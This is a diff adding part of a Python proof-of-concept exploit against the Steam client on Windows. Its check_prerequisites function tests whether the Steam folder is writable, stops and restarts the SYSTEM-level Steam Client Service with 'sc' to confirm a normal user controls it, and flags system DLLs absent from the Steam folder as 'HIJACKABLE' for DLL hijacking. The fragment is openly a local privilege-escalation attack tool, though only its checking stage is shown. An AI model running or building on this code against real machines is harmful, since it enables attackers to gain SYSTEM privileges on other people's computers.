@@ -1,0 +1,37 @@
+STEAM_DIR = r"C:\Program Files (x86)\Steam"
+STEAM_SVC = "Steam Client Service"
+
+def check_prerequisites():
+    """Verify conditions for exploitation."""
+    # 1. Writable directory
+    test = os.path.join(STEAM_DIR, ".poc_write_test")
+    try:
+        with open(test, "w") as f:
+            f.write("test")
+        os.remove(test)
+        print(f"[+] {STEAM_DIR} is WRITABLE by current user")
+    except PermissionError:
+        print(f"[-] {STEAM_DIR} is NOT writable")
+        return False
+
+    # 2. Controllable service
+    r = subprocess.run(
+        ["sc", "stop", STEAM_SVC],
+        capture_output=True, text=True, timeout=10
+    )
+    if r.returncode == 0:
+        print("[+] sc stop: SUCCESS (user can stop SYSTEM service)")
+        time.sleep(2)
+        subprocess.run(["sc", "start", STEAM_SVC],
+                       capture_output=True, timeout=10)
+        print("[+] sc start: service restarted")
+
+    # 3. Hijackable DLLs
+    candidates = ["VERSION.dll", "USERENV.dll", "WTSAPI32.dll",
+                  "DBGHELP.dll", "dbgcore.dll", "bcrypt.dll"]
+    for dll in candidates:
+        in_steam = os.path.join(STEAM_DIR, dll)
+        in_sys = os.path.join(r"C:\Windows\SysWOW64", dll)
+        if not os.path.exists(in_steam) and os.path.exists(in_sys):
+            print(f"[+] {dll}: NOT in Steam -> HIJACKABLE")
+    return True
